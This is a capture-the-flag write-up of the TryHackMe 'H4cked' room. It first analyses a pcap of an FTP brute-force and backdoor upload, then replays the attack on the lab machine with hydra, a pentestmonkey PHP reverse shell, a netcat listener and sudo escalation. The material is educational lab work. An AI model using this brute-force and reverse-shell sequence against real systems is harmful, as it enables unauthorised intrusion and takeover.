#write-up
#done


![[Pasted image 20240202174634.png]]

This is a write-up for the H4cked room on tryhackme, this consists of analyzing a .pcap file to find-out the details of a hack against a server.
we will be using wireshark for the Analysis 
`wireshark Capture.pcapng `
![[Pasted image 20240202175239.png]]



## Task 1  -- Oh no! We've been hacked!
- The attacker is trying to log into a specific service. What service is this?
Answer --> `FTP`
The first request in the pcap file is a login request to port 21(FTP). Following the tcp-stream, we saw that the attacker tried to login-to the user 'Jenny' but failed
![[Pasted image 20240202175716.png]]
note : to follow tcp stream, right click on the traffic then select tcp-stream under the follow option
![[Pasted image 20240202175655.png]]




- There is a very popular tool by Van Hauser which can be used to brute force a series of services. What is the name of this tool?
ANSWER --> hydra 
Let's check the traffics for any brute-force attempts
![[Pasted image 20240202180801.png]]

here we found a brute-force attempt against The ftp service. now lets make a quick google search for tools used to brute-force ftp

![[Pasted image 20240202180925.png]]

We found a tool called hydra 

Answer --> `HYDRA`


- The attacker is trying to log on with a specific username. What is the username?

Analyzing the failed login traffic, we found a specific username the attacker was trying to log on.
![[Screenshot 2024-02-02 at 18.28.42.png]]

ANSWER --> JENNY


- What is the user's password?
To get the user's password, we need to check the successful login tcp stream, this can be done by searching for ftp Successful login.
`ftp.response.code == 230 `
 ![[Pasted image 20240202183627.png]]

now let's follow the  tcp stream for the first traffic to see the login credentials 

![[Pasted image 20240202183732.png]]

 ANSWER --> password123 

- What is the current FTP working directory after the attacker logged in?

We can get the full detail of the FTP connection session by following the connection stream. Now lets try following the tcp stream.
`ftp.response.code == 230`
Then select the second traffic 
![[Screenshot 2024-02-02 at 18.43.07.png]]
now follow the tcp stream of the traffic 
![[Pasted image 20240202184347.png]]

the current Directory is specified on line 9

ANSWER --> /var/www/html


- The attacker uploaded a backdoor. What is the backdoor's filename?
in the tcp-stream we can see the attacker uploaded a file name store.php
![[Screenshot 2024-02-02 at 18.49.03.png]]

ANSWER -->  shell.php 

 - The backdoor can be downloaded from a specific URL, as it is located inside the uploaded file. What is the full URL?

Given in the hint section, using the `ftp-data` filter and then following the stream, we can view the content of the uploaded shell 
![[Screenshot 2024-02-02 at 20.05.16.png]]

answer --> http://pentestmonkey.net/tools/php-reverse-shell






-  Which command did the attacker manually execute after getting a reverse shell?
since we have the attacker's payload, lets check the port specified in it 
![[Screenshot 2024-02-02 at 20.09.27.png]]
port 80 , now lets search for all the requests to the specifies ip address and the port
`ip.dest == 192.168.0.147 && tcp.port == 80`
now follow the tcp-stream of the PSH and ACK
![[Pasted image 20240202201847.png]]

Following the tcp-stream we see all the activities of the attacker including all the command being executed 
![[Screenshot 2024-02-02 at 19.04.32.png]]

ANSWER --> whoami


 - What is the computer's hostname? 
Answer --> wir3



- Which command did the attacker execute to spawn a new TTY shell?
![[Screenshot 2024-02-02 at 19.09.21.png]]

--> python3 -c 'import pty; pty.spawn("/bin/bash")'


- Which command was executed to gain a root shell?
Here to get the root shell, the attacker logged into jenny's account using the ftp credentials. then the attacker checked for all jenny's sudo privileges where the attacker discovered that jenny had the privilege to access the root account without a password.

![[Screenshot 2024-02-02 at 19.10.45.png]]
 
 ANSWER --> `sudo su`

- The attacker downloaded something from GitHub. What is the name of the GitHub project?

![[Screenshot 2024-02-02 at 19.18.26.png]]

Answer -- REPTILE 


-  The project can be used to install a stealthy backdoor on the system. It can be very hard to detect. What is this type of backdoor called?

from the Github repo about section, it specifies that the backdoor is a rootkit
![[Screenshot 2024-02-02 at 19.22.23.png]]




## TASK 2 -- Hack your way back into the machine

The attacker has changed the user's password! Can you replicate the attacker's steps and read the flag.txt? The flag is located in the /root/Reptile directory. Remember, you can always look back at the .pcap file if necessary. Good luck!


Lets start by scanning the target using nmap 

`nmap 10.10.125.249`
![[Pasted image 20240202203249.png]]

Now lets brute-force the FTP service using the /usr/share/wordlists/rockyou.txt wordlist.
```bash
┌──(wraith㉿kali)-[~/thm/h4cked]
└─$ hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://10.10.125.249
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-02 13:34:44
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.125.249:21/
[21][ftp] host: 10.10.125.249   login: jenny   password: 987654321
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-02 13:35:12

```

USER : jenny 
PASS: 987654321

FTP SERVER ACCESS 
![[Pasted image 20240202204024.png]]

Now lets upload our reverse shell payload.
there is a pre-built pentest-monkey revshell payload in kali-linux located in `/usr/share/webshells/php/php-reverse-shell.php`. 
lets copy the payload to our current directory and then fill in our credentials (ip-address, port)
![[Screenshot 2024-02-02 at 20.45.06.png]]

now lets save this file and upload it to the ftp server.


```
ftp> put shell.php 
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||45246|)
150 Ok to send data.
100% |******************************************|  5493       17.87 MiB/s    00:00 ETA
ftp> chmod +x shell.php
200 SITE CHMOD command ok.
ftp> 

```

Now that we've uploaded our payload and assigned it the proper permissions, lets run it and get a reverse shell. 
creating Listener :
`nc -nlvp 2020`
triggering payload
http://ip/shell.php 

BOOM!! We have our shell 
![[Pasted image 20240203055830.png]]
lets stabilize our shell and log on to Jenny's account .
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
ctrl + z
stty raw -echo; fg
export TERM=xterm
```

Jenny's Account 
```
www-data@wir3:/$ su jenny
su jenny
Password: 987654321

jenny@wir3:/$ 
```


PRIVILEGE ESCALATION

```
jenny@wir3:/$ sudo -l
sudo -l
[sudo] password for jenny: 987654321

Matching Defaults entries for jenny on wir3:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jenny may run the following commands on wir3:
    (ALL : ALL) ALL
jenny@wir3:/$ 

```

Since jenny's account has the privilege to run all commands on the system, lets log on directly to the root user.
```
jenny@wir3:/$ sudo su
sudo su
root@wir3:/# whoami
whoami
root
root@wir3:/# 

```

From here we can get our flag and submit it 




THANK YOU 🙏
